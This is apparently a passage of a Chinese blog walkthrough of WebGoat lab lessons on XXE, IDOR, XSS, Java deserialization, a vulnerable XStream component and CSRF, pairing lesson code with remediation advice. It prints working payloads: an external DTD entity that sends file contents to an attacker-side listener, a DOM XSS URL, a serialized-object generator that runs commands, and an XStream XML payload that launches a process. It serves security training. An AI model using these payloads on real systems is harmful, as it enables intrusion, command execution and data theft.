&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Solution is posted as a separate comment        if (commentStr.contains(CONTENTS)) &amp;#123;            return success(this).build();        &amp;#125;        try &amp;#123;        	boolean secure = false;        	if (null != request.getSession().getAttribute(&amp;quot;applySecurity&amp;quot;)) &amp;#123;        		secure = true;        	&amp;#125;            Comment comment = comments.parseXml(commentStr, secure);            if (CONTENTS.contains(comment.getText())) &amp;#123;                comment.setText(&amp;quot;Nice try, you need to send the file to WebWolf&amp;quot;);            &amp;#125;            comments.addComment(comment, false);        &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;a.dtd 上传在攻击服务器上&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY % payload  &amp;quot;&amp;lt;!ENTITY attack SYSTEM &amp;#x27;http://127.0.0.1:9090/landing?text=%file;&amp;#x27;&amp;gt;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;xxe04.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;数据通过实体引用成功回显啦&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;xxe05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;水平越权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#水平越权&#34;&gt;#&lt;/a&gt; 水平越权&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-7&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;水平越权漏洞，是一种 “基于数据的访问控制” 设计缺陷引起的漏洞。由于服务器端在接收到请求数据进行操作时，没有判断数据的所属人，而导致的越权数据访问漏洞。如服务器端从客户端提交的 request 参数（用户可控数据）中获取用户 id，恶意攻击者通过变换请求 ID 的值，查看或修改不属于本人的数据。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-7&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;服务器端对数据的访问控制验证不充分&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-7&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;p&gt;idor–&amp;gt;IDORViewOtherProfile&lt;/p&gt;
&lt;p&gt;安全代码将确保在拆除所请求的配置文件之前确保有一个水平访问控制检查&lt;/p&gt;
&lt;p&gt;例如检查登录用户的 session 中的 id（用户不可控）是否和请求的 id 一致&lt;/p&gt;
&lt;p&gt;if(requestedProfile.getUserId().equals(authUserId))&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (userSessionData.getValue(&lt;span class=&#34;string&#34;&gt;&amp;quot;idor-authenticated-as&amp;quot;&lt;/span&gt;).equals(&lt;span class=&#34;string&#34;&gt;&amp;quot;tom&amp;quot;&lt;/span&gt;)) &amp;#123;            &lt;span class=&#34;comment&#34;&gt;//going to use session auth to view this one            String authUserId = (String) userSessionData.getValue(&amp;quot;idor-authenticated-user-id&amp;quot;);            if (userId != null &amp;amp;&amp;amp; !userId.equals(authUserId)) &amp;#123;                //on the right track                UserProfile requestedProfile = new UserProfile(userId);                // secure code would ensure there was a horizontal access control check prior to dishing up the requested profile                 if (requestedProfile.getUserId().equals(&amp;quot;2342388&amp;quot;)) &amp;#123;                    return success(this).feedback(&amp;quot;idor.view.profile.success&amp;quot;).output(requestedProfile.profileToMap().toString()).build();                &amp;#125; else &amp;#123;                    return failed(this).feedback(&amp;quot;idor.view.profile.close1&amp;quot;).build();                &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;yq01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;xss跨站脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss跨站脚本&#34;&gt;#&lt;/a&gt; XSS 跨站脚本&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-8&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;跨站脚本攻击（Cross Site Script）是一种将恶意 JavaScript 代码插入到其他 Web 用户页面里执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在 HTML 页面里嵌入恶意代码。当用户浏览该页时，这些嵌入在 HTML 中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie 窃取、帐户劫持、拒绝服务攻击等。&lt;/p&gt;
&lt;p&gt;跨站脚本攻击有以下攻击形式：&lt;/p&gt;
&lt;p&gt;1、反射型跨站脚本攻击&lt;/p&gt;
&lt;p&gt;攻击者利用社会工程学等手段，发送一个 URL 链接给用户打开，在用户打开页面的同时，浏览器会执行页面中嵌入的恶意脚本。&lt;/p&gt;
&lt;p&gt;2、存储型跨站脚本攻击&lt;/p&gt;
&lt;p&gt;攻击者利用应用程序提供的录入或修改数据的功能，将数据存储到服务器或用户 cookie 中，当其他用户浏览展示该数据的页面时，浏览器会执行页面中嵌入的恶意脚本，所有浏览者都会受到攻击。&lt;/p&gt;
&lt;p&gt;3、DOM 跨站脚本攻击&lt;/p&gt;
&lt;p&gt;由于 HTML 页面中，定义了一段 JS，根据用户的输入，显示一段 HTML 代码，攻击者可以在输入时，插入一段恶意脚本，最终展示时，会执行恶意脚本。&lt;/p&gt;
&lt;p&gt;DOM 跨站脚本攻击和以上两个跨站脚本攻击的区别是，DOM 跨站是纯页面脚本的输出，只有规范使用 JavaScript，才可以防御。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-8&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;在 HTML 中常用到字符实体，将常用到的字符实体没有进行转译，导致完整的标签出现，在可输入的文本框等某些区域内输入特定的某些标签导致代码被恶意篡改。&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-8&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;xss–&amp;gt;CrossSiteScriptingLesson5a&lt;/p&gt;
&lt;p&gt;反射型 xss&lt;/p&gt;
&lt;p&gt;题目用正则表达式匹配用户输入的参数 field1，因为是题目需求这里匹配 &amp;quot;.*&amp;lt;script&amp;gt;(console\.log|alert)\(.&lt;em&gt;\);?&amp;lt;\/script&amp;gt;.&lt;/em&gt;&amp;quot; 后在页面上进行输出&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Predicate&amp;lt;String&amp;gt; XSS_PATTERN = Pattern.compile(            &lt;span class=&#34;string&#34;&gt;&amp;quot;.*&amp;lt;script&amp;gt;(console\\.log|alert)\\(.*\\);?&amp;lt;\\/script&amp;gt;.*&amp;quot;&lt;/span&gt;            , Pattern.CASE_INSENSITIVE).asMatchPredicate();&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (XSS_PATTERN.test(field1)) &amp;#123;            userSessionData.setValue(&lt;span class=&#34;string&#34;&gt;&amp;quot;xss-reflected-5a-complete&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt;);            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (field1.toLowerCase().contains(&lt;span class=&#34;string&#34;&gt;&amp;quot;console.log&amp;quot;&lt;/span&gt;)) &amp;#123;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; success(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;xss-reflected-5a-success-console&amp;quot;&lt;/span&gt;).output(cart.toString()).build();            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; success(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;xss-reflected-5a-success-alert&amp;quot;&lt;/span&gt;).output(cart.toString()).build();            &amp;#125;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;xss02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修复建议：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;根据要在何处使用用户输入，使用适当的转义 / 编码技术：HTML 转义，JavaScript 转义，CSS 转义，URL 转义等。使用现有的转义库，除非绝对必要，否则请不要编写自己的库。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果用户输入需要包含 HTML，则无法对其进行转义 / 编码，因为它会破坏有效的标签。在这种情况下，请使用受信任且经过验证的库来解析和清除 HTML。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;为 cookie 设置 HttpOnly 标志&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用内容安全策略&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DOM 型&lt;/p&gt;
&lt;p&gt;源码中使用路由，路由中的参数而无需编码可以执行 WebGoat 中的内部功能&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;xss01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// something like ... http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;amp;_someVar=234902384lotslsfjdOf9889080GarbageHere%3Cscript%3Ewebgoat.customjs.phoneHome();%3C%2Fscript%3E--andMoreGarbageHere// or http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;amp;_someVar=234902384lotslsfjdOf9889080GarbageHere&amp;lt;script&amp;gt;webgoat.customjs.phoneHome();&amp;lt;%2Fscript&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;通过 url 触发路由内部函数的执行&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;amp;_someVar=234902384lotslsfjdOf9889080GarbageHere&amp;lt;script&amp;gt;webgoat.customjs.phoneHome();&amp;lt;%2Fscript&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;xss03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修复建议：规范使用 JavaScript&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反序列化&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h1&gt;
&lt;p&gt;反序列化漏洞呢是一个说复杂也不复杂，说不复杂也很复杂的问题，要理解的点还是有很多的，&lt;a href=&#34;https://www.cnblogs.com/ssooking/p/5875215.html&#34;&gt;这里就讲的很细&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;deserialization–&amp;gt;InsecureDeserializationTask&lt;/p&gt;
&lt;p&gt;根据 if (!(o instanceof VulnerableTaskHolder))，可以发现，我们序列化的实例应该是 VulnerableTaskHolder&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; (ObjectInputStream ois = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ObjectInputStream(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ByteArrayInputStream(Base64.getDecoder().decode(b64token)))) &amp;#123;            before = System.currentTimeMillis();            Object o = ois.readObject();            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!(o &lt;span class=&#34;keyword&#34;&gt;instanceof&lt;/span&gt; VulnerableTaskHolder)) &amp;#123;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (o &lt;span class=&#34;keyword&#34;&gt;instanceof&lt;/span&gt; String) &amp;#123;                    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;insecure-deserialization.stringobject&amp;quot;&lt;/span&gt;).build();                &amp;#125;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;insecure-deserialization.wrongobject&amp;quot;&lt;/span&gt;).build();            &amp;#125;            after = System.currentTimeMillis();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;VulnerableTaskHolder 定位到 Runtime.getRuntime ().exec (taskAction)&lt;/p&gt;
&lt;p&gt;并且 taskAction 是在构造函数里被赋值的&lt;/p&gt;
&lt;p&gt;所以我们可以通过控制 taskAction 来控制执行的命令（eg. VulnerableTaskHolder go = new VulnerableTaskHolder (“sleep”, “sleep 6”)），将对象使用序列化工具序列化，提交至后端处理，就会触发&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//condition is here to prevent you from destroying the goat altogether		if ((taskAction.startsWith(&amp;quot;sleep&amp;quot;)||taskAction.startsWith(&amp;quot;ping&amp;quot;))				&amp;amp;&amp;amp; taskAction.length() &amp;lt; 22) &amp;#123;		log.info(&amp;quot;about to execute: &amp;#123;&amp;#125;&amp;quot;, taskAction);		try &amp;#123;            Process p = Runtime.getRuntime().exec(taskAction);            BufferedReader in = new BufferedReader(                                new InputStreamReader(p.getInputStream()));            String line = null;            while ((line = in.readLine()) != null) &amp;#123;                log.info(line);            &amp;#125;        &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;序列化 VulnerableTaskHolder 对象，base64 编码&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt;&lt;/span&gt;&amp;#123;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;&amp;#123;            VulnerableTaskHolder go = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; VulnerableTaskHolder(&lt;span class=&#34;string&#34;&gt;&amp;quot;sleep&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;sleep 6&amp;quot;&lt;/span&gt;);            ByteArrayOutputStream bos = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ByteArrayOutputStream();            ObjectOutputStream oos = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ObjectOutputStream(bos);            oos.writeObject(go);            oos.flush();            &lt;span class=&#34;keyword&#34;&gt;byte&lt;/span&gt;[] exploit = bos.toByteArray();            String exp = Base64.getEncoder().encodeToString(exploit);            System.out.println(exp);        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (Exception e)&amp;#123;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;提交后反序列化后的对象&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;des01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是没有执行成功，谷歌了一下，说是用 java 调用 CMD 命令时，需要指定 ，但是这个会改变现存代码逻辑，暂未实现，实现后再更新&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;des02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;反序列化漏洞修复建议：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 如果是第三方组件存在反序列化漏洞，建议更新版本或打补丁2. 加强对Runtime.exec相关代码的检测3. 条件允许的话，禁止JVM执行外部命令
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;第三方组件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第三方组件&#34;&gt;#&lt;/a&gt; 第三方组件&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-9&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;系统中引用了存在已知漏洞的第三方组件，如 Jackson 反序列化漏洞、Struts2 远程代码执行漏洞等，可能会直接或间接导致系统沦陷。&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-9&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://x-stream.github.io/CVE-2013-7285.html&#34;&gt;CVE-2013-7285 漏洞详情&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;攻击者可以通过版本信息找到相应的 cve 漏洞和 payload 进行利用，如下就是通过构造 ContactImpl 的 xml 格式通关。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;        	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!StringUtils.isEmpty(payload)) &amp;#123;        		payload = payload.replace(&lt;span class=&#34;string&#34;&gt;&amp;quot;+&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;).replace(&lt;span class=&#34;string&#34;&gt;&amp;quot;\r&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;).replace(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;).replace(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;).replace(&lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;lt;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt;);        	&amp;#125;            contact = (Contact) xstream.fromXML(payload);        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (Exception ex) &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;vulnerable-components.close&amp;quot;&lt;/span&gt;).output(ex.getMessage()).build();        &amp;#125;                &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;!=contact) &amp;#123;            	contact.getFirstName();&lt;span class=&#34;comment&#34;&gt;//trigger the example like https://x-stream.github.io/CVE-2013-7285.html            &amp;#125;             if (!(contact instanceof ContactImpl)) &amp;#123;            	return success(this).feedback(&amp;quot;vulnerable-components.success&amp;quot;).build();            &amp;#125;        &amp;#125; catch (Exception e) &amp;#123;        	return success(this).feedback(&amp;quot;vulnerable-components.success&amp;quot;).output(e.getMessage()).build();        &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例案例中，可以通过构造 xml 格式的数据，造成 rce&lt;/p&gt;
&lt;p&gt;第三方漏洞修复建议：更新到最新版本，或者打补丁&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;sorted-set&amp;gt;  &amp;lt;string&amp;gt;foo&amp;lt;/string&amp;gt;  &amp;lt;dynamic-proxy&amp;gt;    &amp;lt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;interface&lt;/span&gt;&amp;gt;&lt;span class=&#34;title&#34;&gt;java&lt;/span&gt;.&lt;span class=&#34;title&#34;&gt;lang&lt;/span&gt;.&lt;span class=&#34;title&#34;&gt;Comparable&lt;/span&gt;&amp;lt;/&lt;span class=&#34;title&#34;&gt;interface&lt;/span&gt;&amp;gt;    &amp;lt;&lt;span class=&#34;title&#34;&gt;handler&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;class&lt;/span&gt;&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;java.beans.EventHandler&amp;quot;&lt;/span&gt;&amp;gt;      &amp;lt;target &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt;&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;java.lang.ProcessBuilder&amp;quot;&lt;/span&gt;&amp;gt;        &amp;lt;command&amp;gt;          &amp;lt;string&amp;gt;cacl.exe&amp;lt;/string&amp;gt;        &amp;lt;/command&amp;gt;      &amp;lt;/target&amp;gt;      &amp;lt;action&amp;gt;start&amp;lt;/action&amp;gt;    &amp;lt;/handler&amp;gt;  &amp;lt;/dynamic-proxy&amp;gt;&amp;lt;/sorted-set&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功弹出计算器&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;301.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;csrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf&#34;&gt;#&lt;/a&gt; CSRF&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-10&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;CSRF（Cross-site request forgery）跨站请求伪造，也被称为 “One Click Attack” 或者 Session Riding，通常缩写为 CSRF 或者 XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与 XSS 非常不同，XSS 利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。与 XSS 攻击相比，CSRF 攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比 XSS 更具危险性。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-9&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;网站的 cookie 在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的 csrf 脚本或包含 csrf 脚本的链接，可能会执行一些用户不想做的功能&lt;/p&gt;
&lt;h2 id=&#34;部分代码及修复建议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#部分代码及修复建议&#34;&gt;#&lt;/a&gt; 部分代码及修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;csrf–&amp;gt;ForgedReviews.createNewReview()&lt;/p&gt;
&lt;p&gt;只判断了 refer 值&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;csrf1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;bp 一键生成&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;csrf01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
